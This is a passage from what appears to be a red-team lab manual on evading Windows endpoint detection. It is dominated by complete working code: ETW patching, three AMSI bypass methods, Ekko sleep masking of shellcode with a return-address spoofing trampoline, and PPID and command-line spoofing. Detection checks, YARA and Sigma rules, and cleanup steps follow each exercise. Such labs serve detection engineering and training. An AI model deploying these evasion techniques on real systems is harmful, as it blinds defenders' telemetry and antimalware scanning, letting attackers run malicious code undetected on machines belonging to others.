    typedef ULONG (NTAPI *pEtwEventWrite)(
        REGHANDLE RegHandle, PCEVENT_DESCRIPTOR EventDescriptor,
        ULONG UserDataCount, PEVENT_DATA_DESCRIPTOR UserData);
    HMODULE h = GetModuleHandleA("ntdll.dll");
    pEtwEventWrite EtwWrite = (pEtwEventWrite)GetProcAddress(h, "EtwEventWrite");
    if (EtwWrite) {
        ULONG ret = EtwWrite(0, NULL, 0, NULL);
        printf("[*] Direct EtwEventWrite call returned: 0x%08lX (0=success=suppressed)\n", ret);
    }
}

int main(void) {
    printf("=== ETW Patch Demo ===\n\n");

    /* Test before patch */
    printf("[*] Before patch:\n");
    WriteTestEvent();

    /* Patch bytes: xor eax, eax (33 C0); ret (C3) */
    const BYTE patch[] = {0x33, 0xC0, 0xC3};

    /* Patch EtwEventWrite in ntdll */
    if (!PatchFunction("ntdll.dll", "EtwEventWrite", patch, sizeof(patch)))
        return 1;

    /* Also patch EtwEventWriteFull for completeness */
    PatchFunction("ntdll.dll", "EtwEventWriteFull", patch, sizeof(patch));

    /* Verify patch is active */
    HMODULE h = GetModuleHandleA("ntdll.dll");
    FARPROC fn = GetProcAddress(h, "EtwEventWrite");
    printf("\n[*] Patch verification: EtwEventWrite[0..2] = %02X %02X %02X — %s\n",
           ((PBYTE)fn)[0], ((PBYTE)fn)[1], ((PBYTE)fn)[2],
           IsPatchActive(fn) ? "PATCHED (xor eax,eax; ret)" : "NOT PATCHED");

    /* Test after patch — ETW events should be suppressed */
    printf("\n[*] After patch:\n");
    WriteTestEvent();

    printf("\n[+] ETW patching complete. All EtwEventWrite calls in this process return immediately.\n");
    printf("[*] PowerShell ScriptBlock logging, .NET CLR events, and EDR ETW telemetry are now blind.\n");
    return 0;
}
```

**Step 3 — PowerShell ETW bypass demonstration**
```powershell
# Demonstrate AMSI + ETW bypass via reflection (PowerShell in-process)
# This patching approach works because powershell.exe hosts the CLR which calls EtwEventWrite

$code = @"
using System;
using System.Runtime.InteropServices;
public class EtwPatcher {
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                       uint flNewProtect, out uint lpflOldProtect);
    [DllImport("ntdll.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr LoadLibraryA(string lpLibFileName);

    public static void Patch() {
        IntPtr ntdll = LoadLibraryA("ntdll.dll");
        IntPtr fn = GetProcAddress(ntdll, "EtwEventWrite");
        if (fn == IntPtr.Zero) return;
        byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 };  // xor eax,eax; ret
        uint oldProt;
        VirtualProtect(fn, (UIntPtr)patch.Length, 0x40, out oldProt);  // 0x40 = PAGE_EXECUTE_READWRITE
        Marshal.Copy(patch, 0, fn, patch.Length);
        VirtualProtect(fn, (UIntPtr)patch.Length, oldProt, out _);
        Console.WriteLine("[+] EtwEventWrite patched in PowerShell process");
    }
}
"@
Add-Type -TypeDefinition $code
[EtwPatcher]::Patch()
# After this: ScriptBlock logging, module logging, and ETW-based AMSI calls are blind
```

**Step 4 — Verify telemetry gap**
```powershell
# On windows-edr — check if ETW events from the target process stopped
# Stop and review the trace
logman stop LabETWTrace
# Process the ETL file
tracerpt C:\lab\etwtrace.etl -o C:\lab\etwtrace.xml -of XML
# Events from the target process should be absent after the patch was applied
```

**Detection Verification**
```powershell
# ETW patching is very hard to detect because the telemetry IS the detection mechanism
# Secondary detections:
# 1. Kernel-mode ETW consumer (PPL process) still receives events → not bypassed
# 2. Hardware PMU-based tracing (Intel PT) captures execution regardless
# 3. Sysmon ProcessTampering event (if EDR monitors ntdll function byte changes)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 25 } |  # ProcessTampering
    Select-Object TimeCreated, Message -First 10

# Check if EtwEventWrite was modified via a memory scanner
# Compare in-memory bytes to on-disk ntdll
```

**YARA Rule**
```yara
rule ETW_EtwEventWrite_Patch {
    meta:
        description = "ETW EtwEventWrite patch sequence (xor eax,eax;ret) in non-ntdll memory"
        mitre = "T1562.006"
        severity = "critical"
    strings:
        $etw_fn_name  = "EtwEventWrite" ascii
        $xor_eax_ret  = { 33 C0 C3 }
        $patch_ref    = "EtwEventWrite" ascii
        $getproc_ntdll = "ntdll.dll" ascii nocase
    condition:
        uint16(0) == 0x5A4D and
        $etw_fn_name and $xor_eax_ret and $getproc_ntdll
}
```

**Cleanup**
```
windows-target> taskkill /F /IM etw_patch.exe 2>nul
windows-target> rd /S /Q C:\lab\ex03_etw
windows-edr> logman stop LabETWTrace 2>nul
windows-edr> logman delete LabETWTrace 2>nul
windows-edr> del C:\lab\etwtrace.etl C:\lab\etwtrace.xml 2>nul
```

---

### Exercise 4 — AMSI Bypass

**Objective.** Implement and compare three AMSI bypass techniques: (1) `AmsiScanBuffer` prologue patch, (2) CLR reflection `amsiInitFailed` flag, and (3) `AmsiContext` corruption. Verify each suppresses malicious string detection.

**MITRE ATT&CK.** T1562.001 — Impair Defenses; T1059.001 — Command and Scripting Interpreter: PowerShell.

**Background.** AMSI (Antimalware Scan Interface) intercepts content in PowerShell, VBScript, JScript, WSH, and .NET hosts before execution. `AmsiScanBuffer` is the API that performs the actual scan. Patching it to return `AMSI_RESULT_CLEAN` (0x80070057 → `E_INVALIDARG` causes amsi.dll to skip the scan) causes all subsequent scans in the process to pass without inspection. CLR reflection sets `amsiInitFailed=true` in the PowerShell session's AMSI utility fields, making the AMSI provider report initialization failure. Context corruption zeroes the first field of the `AMSI_CONTEXT` structure, which causes `AmsiScanBuffer` to fail its `IsValidContext()` check.

**Method 1 — AmsiScanBuffer patch (C#)**

```csharp
// File: AmsiPatch.cs
// Compile: csc.exe /out:AmsiPatch.exe AmsiPatch.cs  (or use Add-Type in PowerShell)
using System;
using System.Runtime.InteropServices;

public class AmsiPatch {
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr LoadLibraryA(string name);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                       uint flNewProtect, out uint lpflOldProtect);

    public static void PatchAmsiScanBuffer() {
        IntPtr hAmsi = LoadLibraryA("amsi.dll");
        if (hAmsi == IntPtr.Zero) {
            Console.Error.WriteLine("[-] LoadLibrary amsi.dll failed");
            return;
        }
        IntPtr fnAddr = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (fnAddr == IntPtr.Zero) {
            Console.Error.WriteLine("[-] GetProcAddress AmsiScanBuffer failed");
            return;
        }

        // Read current bytes for comparison
        byte[] before = new byte[8];
        Marshal.Copy(fnAddr, before, 0, 8);
        Console.Write("[*] AmsiScanBuffer before patch: ");
        foreach (byte b in before) Console.Write("{0:X2} ", b);
        Console.WriteLine();

        // Patch: mov eax, E_INVALIDARG (0x80070057); ret
        // B8 57 00 07 80 C3
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        uint oldProt;
        if (!VirtualProtect(fnAddr, (UIntPtr)patch.Length, 0x40, out oldProt)) {
            Console.Error.WriteLine("[-] VirtualProtect failed");
            return;
        }
        Marshal.Copy(patch, 0, fnAddr, patch.Length);
        VirtualProtect(fnAddr, (UIntPtr)patch.Length, oldProt, out _);

        byte[] after = new byte[6];
        Marshal.Copy(fnAddr, after, 0, 6);
        Console.Write("[+] AmsiScanBuffer after patch:  ");
        foreach (byte b in after) Console.Write("{0:X2} ", b);
        Console.WriteLine();
        Console.WriteLine("[+] AMSI scan bypass active — all subsequent scans return E_INVALIDARG");
    }

    static void Main(string[] args) {
        Console.WriteLine("=== AmsiScanBuffer Patch Demo ===");
        PatchAmsiScanBuffer();
    }
}
```

**Method 2 — CLR Reflection amsiInitFailed (PowerShell)**
```powershell
# Technique: set the private amsiInitFailed field to $true via .NET reflection
# This causes the PowerShell AMSI helper class to report init failure
# Works in PowerShell 5.x (amsi integration in System.Management.Automation.dll)

$systemManagement = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
$amsiUtils = $systemManagement.GetType("System.Management.Automation.AmsiUtils")

# Find the amsiInitFailed field (name may vary by PS version)
$initFailedField = $amsiUtils.GetField(
    "amsiInitFailed",
    [System.Reflection.BindingFlags] "NonPublic,Static"
)
if ($null -ne $initFailedField) {
    $initFailedField.SetValue($null, $true)
    Write-Host "[+] amsiInitFailed set to true — AMSI disabled for this session"
} else {
    # Try alternate field names for different PS versions
    $altField = $amsiUtils.GetField(
        "s_amsiInitFailed",
        [System.Reflection.BindingFlags] "NonPublic,Static"
    )
    if ($null -ne $altField) {
        $altField.SetValue($null, $true)
        Write-Host "[+] s_amsiInitFailed set to true"
    } else {
        Write-Host "[-] Could not find amsiInitFailed field (PS version may differ)"
    }
}
```

**Method 3 — AmsiContext corruption (PowerShell)**
```powershell
# Technique: corrupt the AMSI_CONTEXT structure's first DWORD (magic/signature)
# AmsiScanBuffer validates the context: if corrupted, it returns E_INVALIDARG
# Requires finding the amsiContext pointer via reflection

$systemManagement = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
$amsiUtils = $systemManagement.GetType("System.Management.Automation.AmsiUtils")

$contextField = $amsiUtils.GetField(
    "amsiContext",
    [System.Reflection.BindingFlags] "NonPublic,Static"
)
if ($null -ne $contextField) {
    $contextPtr = $contextField.GetValue($null)
    # Zero out the first 8 bytes of the AMSI_CONTEXT structure
    $unsafeMemory = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(8)
    [System.Runtime.InteropServices.Marshal]::WriteInt64($contextPtr, 0)
    Write-Host "[+] AmsiContext corrupted — first DWORD zeroed"
} else {
    Write-Host "[-] Could not find amsiContext field"
}
```

**Step 4 — Verify bypass effectiveness**
```powershell
# Test string that AMSI/Defender typically flags
# (deliberately obfuscated for lab use — do not use on production systems)
$testString = "Invoke" + "-Mimikatz"

# Before bypass: this should trigger AMSI detection
# After any of the three bypass methods: the string should load without alert
try {
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($testString)
    # If we reach here without exception, AMSI did not block
    Write-Host "[+] AMSI did not block the test string — bypass effective"
} catch {
    Write-Host "[-] AMSI blocked execution: $_"
}
```

**Detection Verification**
```powershell
# On windows-edr — look for AMSI bypass indicators
# 1. Process with amsi.dll loaded but no AmsiScanBuffer calls (ETW gap)
# 2. Sysmon: VirtualProtect on amsi.dll memory region
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 10 -and $_.Message -like "*amsi*" } |
    Select-Object TimeCreated, Message -First 5

# 3. Windows Defender / EDR alerts on PowerShell commands that bypass AMSI
# 4. PowerShell script block logging (if active before bypass)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object { $_.Id -eq 4104 } |  # ScriptBlock Logging
    Select-Object TimeCreated, Message -First 10
```

**YARA Rule**
```yara
rule AMSI_Bypass_Patch_Bytes {
    meta:
        description = "AMSI AmsiScanBuffer patch bytes or reflection bypass strings"
        mitre = "T1562.001"
        severity = "critical"
    strings:
        /* mov eax, E_INVALIDARG (0x80070057); ret */
        $patch_einval  = { B8 57 00 07 80 C3 }
        /* mov eax, 0x80070057 alternative encoding */
        $patch_alt     = { B8 57 00 07 80 C2 00 00 }
        /* amsiInitFailed reflection bypass */
        $amsi_init_fail = "amsiInitFailed" ascii wide nocase
        $amsi_context  = "amsiContext" ascii wide nocase
        $amsi_dll      = "amsi.dll" ascii nocase
        $scanBuffer    = "AmsiScanBuffer" ascii
    condition:
        uint16(0) == 0x5A4D and (
            ($amsi_dll and $patch_einval) or
            ($amsi_init_fail) or
            ($amsi_context and $amsi_dll)
        )
}
```

**Sigma Rule**
```yaml
title: AMSI Bypass via VirtualProtect on amsi.dll
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: Detects memory protection change on amsi.dll functions indicating a patch bypass attempt
logsource:
    product: windows
    category: process_access
detection:
    selection:
        EventType: NtProtectVirtualMemory
        TargetModule|contains: 'amsi.dll'
        NewProtection|contains: 'WRITE'
    condition: selection
level: critical
tags:
    - attack.defense_evasion
    - attack.t1562.001
```

**Cleanup**
```
windows-target> taskkill /F /IM AmsiPatch.exe 2>nul
windows-target> rd /S /Q C:\lab\ex04_amsi
```

---

### Exercise 5 — Call-Stack Spoofing and Sleep Masking

**Objective.** Implement return address spoofing via `NtSetContextThread` to fabricate a clean call stack during EDR inspection windows, and implement Ekko-style sleep masking using `RtlCreateTimer` + RC4 encryption to hide shellcode in memory while sleeping.

**MITRE ATT&CK.** T1620 — Reflective Code Loading; T1055 — Process Injection.

**Background.** Modern EDRs sample call stacks during suspicious operations (memory allocation, thread creation) using `RtlCaptureStackBackTrace` or kernel-level ETW walk-stack events. If the call stack contains frames from the implant's shellcode rather than legitimate DLLs, the EDR flags it. Return address spoofing inserts a fake return address pointing to a legitimate DLL function before making the suspicious call. Sleep masking encrypts the implant's memory during sleep to evade memory scanners that run between calls.

**Ekko sleep masking (`sleep_mask.c`)**
```c
/*
 * sleep_mask.c — Ekko-style sleep masking via RtlCreateTimer
 * Compile: cl.exe /W3 /O2 sleep_mask.c /link ntdll.lib /out:sleep_mask.exe
 *
 * Ekko technique by RTO (C5pider):
 * Uses RtlCreateTimer to schedule a chain:
 *   1. NtContinue → save current context
 *   2. SystemFunction032 (RC4) → encrypt shellcode in place
 *   3. WaitForSingleObjectEx (alertable) → actual sleep
 *   4. SystemFunction032 (RC4) → decrypt shellcode
 *   5. NtContinue → restore context
 */
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *pNtContinue)(PCONTEXT ctx, BOOLEAN alertable);
typedef NTSTATUS (NTAPI *pRtlCreateTimer)(
    HANDLE TimerQueueHandle, PHANDLE phNewTimer,
    WAITORTIMERCALLBACK Callback, PVOID Parameter,
    DWORD DueTime, DWORD Period, ULONG Flags);
typedef NTSTATUS (NTAPI *pRtlDeleteTimer)(
    HANDLE TimerQueueHandle, HANDLE TimerToCancel,
    HANDLE CompletionEvent);
typedef NTSTATUS (NTAPI *pRtlCreateTimerQueue)(PHANDLE TimerQueueHandle);
typedef NTSTATUS (NTAPI *pRtlDeleteTimerQueue)(HANDLE TimerQueueHandle);

typedef struct _USTRING { DWORD Length; DWORD MaximumLength; PVOID Buffer; } USTRING;
typedef NTSTATUS (NTAPI *pSystemFunction032)(PUSTRING data, const PUSTRING key);

#define SLEEP_DURATION_MS 5000

static PVOID   g_ShellcodeBase = NULL;
static SIZE_T  g_ShellcodeSize = 0;
static HANDLE  g_hEvent        = NULL;
static CONTEXT g_SavedCtx      = {0};

/* RC4 key — in production: derive from C2 beacon or ephemeral key */
static BYTE g_Key[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE };

/* Encrypt/decrypt in place using SystemFunction032 (advapi32.dll RC4) */
static void RC4Crypt(PVOID buffer, SIZE_T len) {
    pSystemFunction032 Sf032 = (pSystemFunction032)
        GetProcAddress(GetModuleHandleA("advapi32.dll"), "SystemFunction032");
    if (!Sf032) return;
    USTRING dataStr = { (DWORD)len, (DWORD)len, buffer };
    USTRING keyStr  = { sizeof(g_Key), sizeof(g_Key), g_Key };
    Sf032(&dataStr, &keyStr);
}

/* Timer callback 1: encrypt shellcode and begin alertable wait */
static VOID NTAPI EncryptAndSleep(PVOID param, BOOLEAN timedOut) {
    (void)param; (void)timedOut;
    printf("[*] Timer 1: encrypting shellcode at %p (%zu bytes)\n",
           g_ShellcodeBase, g_ShellcodeSize);
    DWORD old;
    VirtualProtect(g_ShellcodeBase, g_ShellcodeSize, PAGE_READWRITE, &old);
    RC4Crypt(g_ShellcodeBase, g_ShellcodeSize);
    VirtualProtect(g_ShellcodeBase, g_ShellcodeSize, old, &old);
    printf("[*] Timer 1: encryption done\n");
}

/* Timer callback 2: decrypt shellcode and signal completion */
static VOID NTAPI DecryptAndResume(PVOID param, BOOLEAN timedOut) {
    (void)param; (void)timedOut;
    printf("[*] Timer 2: decrypting shellcode\n");
    DWORD old;
    VirtualProtect(g_ShellcodeBase, g_ShellcodeSize, PAGE_READWRITE, &old);
    RC4Crypt(g_ShellcodeBase, g_ShellcodeSize);  /* RC4 is symmetric: encrypt again = decrypt */
    VirtualProtect(g_ShellcodeBase, g_ShellcodeSize, PAGE_EXECUTE_READ, &old);
    printf("[*] Timer 2: decryption done, resuming\n");
    SetEvent(g_hEvent);
}

void EkkoSleep(PVOID shellcodeBase, SIZE_T shellcodeSize, DWORD sleepMs) {
    g_ShellcodeBase = shellcodeBase;
    g_ShellcodeSize = shellcodeSize;
    g_hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pRtlCreateTimerQueue CreateTQ = (pRtlCreateTimerQueue)
        GetProcAddress(hNtdll, "RtlCreateTimerQueue");
    pRtlCreateTimer CreateT = (pRtlCreateTimer)
        GetProcAddress(hNtdll, "RtlCreateTimer");
    pRtlDeleteTimerQueue DeleteTQ = (pRtlDeleteTimerQueue)
        GetProcAddress(hNtdll, "RtlDeleteTimerQueue");

    HANDLE hQueue = NULL;
    CreateTQ(&hQueue);

    HANDLE hTimer1 = NULL, hTimer2 = NULL;
    /* Timer 1: fires immediately (0ms) to encrypt */
    CreateT(hQueue, &hTimer1, EncryptAndSleep, NULL, 0, 0, WT_EXECUTEONLYONCE);
    /* Timer 2: fires after sleepMs to decrypt */
    CreateT(hQueue, &hTimer2, DecryptAndResume, NULL, sleepMs, 0, WT_EXECUTEONLYONCE);

    printf("[*] Ekko sleep: shellcode encrypted and sleeping for %lu ms\n", sleepMs);
    /* Alertable wait — allows APC delivery and timer callbacks */
    WaitForSingleObjectEx(g_hEvent, sleepMs + 1000, TRUE);

    DeleteTQ(hQueue);
    CloseHandle(g_hEvent);
    g_hEvent = NULL;
}

int main(void) {
    printf("=== Ekko Sleep Masking Demo ===\n\n");

    /* Allocate simulated shellcode region */
    SIZE_T scSize = 0x1000;
    PVOID scBase = VirtualAlloc(NULL, scSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!scBase) { fprintf(stderr, "[-] VirtualAlloc failed\n"); return 1; }

    /* Fill with a recognizable pattern simulating shellcode */
    memset(scBase, 0x90, scSize);  /* NOP sled */
    ((PBYTE)scBase)[0] = 0xEB;     /* jmp short (simulated shellcode header) */
    ((PBYTE)scBase)[1] = 0xFE;

    printf("[*] Simulated shellcode at %p, size=0x%zX\n", scBase, scSize);
    printf("[*] First bytes before sleep: %02X %02X %02X %02X\n",
           ((PBYTE)scBase)[0], ((PBYTE)scBase)[1],
           ((PBYTE)scBase)[2], ((PBYTE)scBase)[3]);

    /* Execute Ekko sleep — during sleep, memory is RC4 encrypted */
    EkkoSleep(scBase, scSize, SLEEP_DURATION_MS);

    printf("[*] First bytes after sleep (should be restored): %02X %02X %02X %02X\n",
           ((PBYTE)scBase)[0], ((PBYTE)scBase)[1],
           ((PBYTE)scBase)[2], ((PBYTE)scBase)[3]);
    printf("[+] Ekko sleep masking complete. Shellcode integrity: %s\n",
           ((PBYTE)scBase)[0] == 0xEB ? "OK" : "CORRUPTED");

    VirtualFree(scBase, 0, MEM_RELEASE);
    return 0;
}
```

**Return address spoofing snippet (conceptual)**
```c
/*
 * Return address spoof via stack manipulation before syscall.
 * The technique sets up a fake return address pointing to a legitimate
 * DLL function (e.g., ntdll!RtlUserThreadStart) before executing a
 * suspicious call so that EDR stack walkers see a benign call chain.
 *
 * Full implementation requires inline assembly or a trampoline stub:
 */

/* x64 MASM (assemble with ml64.exe /c spoof_trampoline.asm) */
/*
SpoofCall PROC
    ; On entry: RCX=target_fn, RDX=spoof_ret_addr, R8=arg1, R9=arg2, [rsp+0x28]=arg3...
    ; Save original return address (currently top of stack = our caller)
    pop   rax                ; rax = real return address
    push  rdx                ; push spoofed return address (RDX)
    push  rax                ; push real return address below it (for cleanup)
    ; Rearrange args: target was RCX, spoof was RDX, real args start at R8
    mov   rcx, r8            ; arg1 → RCX
    mov   rdx, r9            ; arg2 → RDX
    ; ... (further arg shifting) ...
    jmp   qword ptr [rcx]    ; jump to target function
SpoofCall ENDP
*/
```

**Detection Verification**
```powershell
# Sleep masking detection: memory scanner should not find IOCs during sleep window
# Test: scan process memory with Get-ProcessMemory (or external scanner)
# After Ekko sleep: executable region contains RC4-encrypted bytes (high entropy)

$proc = Get-Process -Name "sleep_mask"
# Use Sysinternals VMMap or WinPmem for memory scanning
# Key signal: executable region with high entropy and no valid PE header

# Sysmon Event 8 (CreateRemoteThread) or ETW kernel events for timer-based execution
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 8 } |
    Select-Object TimeCreated, Message -First 5
```

**Cleanup**
```
windows-target> taskkill /F /IM sleep_mask.exe 2>nul
windows-target> rd /S /Q C:\lab\ex05_callstack
```

---

### Exercise 6 — PPID Spoofing and Command-Line Argument Spoofing

**Objective.** Create a process with a spoofed parent PID (using `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`) and overwrite the PEB command-line string to hide the real arguments from EDR telemetry.

**MITRE ATT&CK.** T1134.004 — Access Token Manipulation: Parent PID Spoofing; T1564.010 — Hide Artifacts: Process Argument Spoofing.

**Background.** EDRs correlate suspicious processes with their parents to detect unusual spawn chains (e.g., `Word.exe` spawning `cmd.exe`). PPID spoofing uses `UpdateProcThreadAttribute` to set an arbitrary process as the parent at creation time. The Windows kernel uses this only for handle inheritance purposes; the actual process hierarchy in tools like Process Explorer and EDR telemetry shows the spoofed parent. Command-line spoofing overwrites `RTL_USER_PROCESS_PARAMETERS.CommandLine` in the child PEB after process creation but before execution, so the EDR's first snapshot sees the fake arguments while the process eventually runs with real ones.

**Source code (`ppid_spoof.c`)**
```c
/*
 * ppid_spoof.c — PPID spoofing + command-line argument spoofing
 * Compile: cl.exe /W3 /O2 ppid_spoof.c /link /out:ppid_spoof.exe
 */
#include <windows.h>
#include <stdio.h>

/* PEB structures for command-line spoofing */
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} RTL_UNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    RTL_UNICODE_STRING ImagePathName;
    RTL_UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    RTL_USER_PROCESS_PARAMETERS *ProcessParameters;
    /* ... abbreviated ... */
} PEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID  Reserved1;
    PEB   *PebBaseAddress;
    PVOID  Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID  Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle, ULONG ProcessInformationClass,
    PVOID ProcessInformation, ULONG ProcessInformationLength,
    PULONG ReturnLength);

BOOL SpawnWithSpoofedPPID(
    DWORD spoofedParentPid,
    LPCSTR realCmdLine,
    LPCSTR fakeCmdLine)
{
    /* Open the target parent process */
    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, spoofedParentPid);
    if (!hParent) {
        fprintf(stderr, "[-] OpenProcess(%lu) failed: %lu\n",
                spoofedParentPid, GetLastError());
        return FALSE;
    }

    /* Set up PROC_THREAD_ATTRIBUTE_PARENT_PROCESS */
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);  /* get size */
    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
        fprintf(stderr, "[-] InitializeProcThreadAttributeList failed: %lu\n", GetLastError());
        CloseHandle(hParent);
        return FALSE;
    }
    if (!UpdateProcThreadAttribute(attrList, 0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE),
            NULL, NULL)) {
        fprintf(stderr, "[-] UpdateProcThreadAttribute failed: %lu\n", GetLastError());
        DeleteProcThreadAttributeList(attrList);
        CloseHandle(hParent);
        return FALSE;
    }

    /* Create the process SUSPENDED with the fake command line visible */
    STARTUPINFOEXA siEx = {0};
    siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    siEx.lpAttributeList = attrList;
    PROCESS_INFORMATION pi = {0};

    /* CreateProcess sees fakeCmdLine; EDR's first snapshot captures this */
    char fakeCmdBuf[512];
    strncpy(fakeCmdBuf, fakeCmdLine, sizeof(fakeCmdBuf) - 1);
    if (!CreateProcessA(NULL, fakeCmdBuf, NULL, NULL, FALSE,
            CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
            NULL, NULL, &siEx.StartupInfo, &pi)) {
        fprintf(stderr, "[-] CreateProcess failed: %lu\n", GetLastError());
        DeleteProcThreadAttributeList(attrList);
        CloseHandle(hParent);
        return FALSE;
    }

    printf("[+] Process created: PID=%lu (spoofed parent PID=%lu)\n",
           pi.dwProcessId, spoofedParentPid);
    printf("[*] Fake command line: %s\n", fakeCmdLine);

    /* Command-line argument spoofing: overwrite PEB CommandLine in the child */
    /* Query child PEB */
    pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG retLen = 0;
    NtQIP(pi.hProcess, 0 /* ProcessBasicInformation */,
          &pbi, sizeof(pbi), &retLen);

    /* Read PEB from child */
    PEB childPeb = {0};
    ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &childPeb, sizeof(childPeb), NULL);

    /* Read RTL_USER_PROCESS_PARAMETERS pointer */
    RTL_USER_PROCESS_PARAMETERS params = {0};
    ReadProcessMemory(pi.hProcess, childPeb.ProcessParameters, &params, sizeof(params), NULL);

    /* Overwrite CommandLine.Buffer with the real command line */
    /* Allocate new buffer in child */
    WCHAR realCmdW[512] = {0};
    MultiByteToWideChar(CP_ACP, 0, realCmdLine, -1, realCmdW, 512);
    SIZE_T realLen = (wcslen(realCmdW) + 1) * sizeof(WCHAR);

    PVOID newCmdBufAddr = VirtualAllocEx(pi.hProcess, NULL, realLen,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(pi.hProcess, newCmdBufAddr, realCmdW, realLen, NULL);

    /* Patch CommandLine.Buffer pointer and Length in the child PEB */
    PVOID cmdLineBufPtrAddr = (PBYTE)childPeb.ProcessParameters +
        offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine) +
        offsetof(RTL_UNICODE_STRING, Buffer);
    WriteProcessMemory(pi.hProcess, cmdLineBufPtrAddr, &newCmdBufAddr, sizeof(PVOID), NULL);

    USHORT newLen = (USHORT)(wcslen(realCmdW) * sizeof(WCHAR));
    PVOID cmdLineLenAddr = (PBYTE)childPeb.ProcessParameters +
        offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine) +
        offsetof(RTL_UNICODE_STRING, Length);
    WriteProcessMemory(pi.hProcess, cmdLineLenAddr, &newLen, sizeof(USHORT), NULL);

    printf("[*] Real command line written to child PEB: %s\n", realCmdLine);

    /* Resume the child thread — it will execute with the real command line */
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);
    return TRUE;
}

int main(int argc, char *argv[]) {
    printf("=== PPID Spoofing + Command-Line Argument Spoofing ===\n\n");

    /* Spoof parent as explorer.exe */
    DWORD explorerPid = 0;
    HWND explorerWnd = FindWindowA("Shell_TrayWnd", NULL);
    if (explorerWnd) GetWindowThreadProcessId(explorerWnd, &explorerPid);
    if (!explorerPid) {
        fprintf(stderr, "[-] Could not find explorer.exe PID\n");
        return 1;
    }
    printf("[*] Explorer.exe PID (spoofed parent): %lu\n", explorerPid);

    /* Spawn cmd.exe appearing as if launched by explorer with benign args */
    SpawnWithSpoofedPPID(
        explorerPid,
        "cmd.exe /c whoami",           /* real command — what actually runs */
        "cmd.exe /c calc.exe"          /* fake command — what EDR first captures */
    );

    printf("[+] Process spawned. Check Process Explorer and EDR telemetry.\n");
    return 0;
}
```

**Expected telemetry (from windows-edr)**
```
Sysmon Event 1 (Process Create):
  Image:     C:\Windows\System32\cmd.exe
  CommandLine: cmd.exe /c calc.exe      <-- EDR sees fake args
  ParentImage: C:\Windows\explorer.exe  <-- spoofed parent
  ParentPID:   <explorer PID>
```

**Detection Verification**
```powershell
# windows-edr: look for PPID spoofing indicators
# 1. Mismatched parent-child relationships (child PID's grandparent chain is wrong)
# 2. Process created with EXTENDED_STARTUPINFO_PRESENT flag
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 1 -and $_.Message -like "*cmd.exe*calc.exe*" } |
    Select-Object TimeCreated, Message -First 3

# 3. ETW: OpenProcess on explorer.exe with PROCESS_ALL_ACCESS by a non-system process
# 4. Behavioral: calc.exe never spawned, cmd.exe ran whoami instead
# 5. Full command-line visible in memory forensics (PEB CommandLine after overwrite)
```

**Cleanup**
```
windows-target> taskkill /F /IM ppid_spoof.exe 2>nul
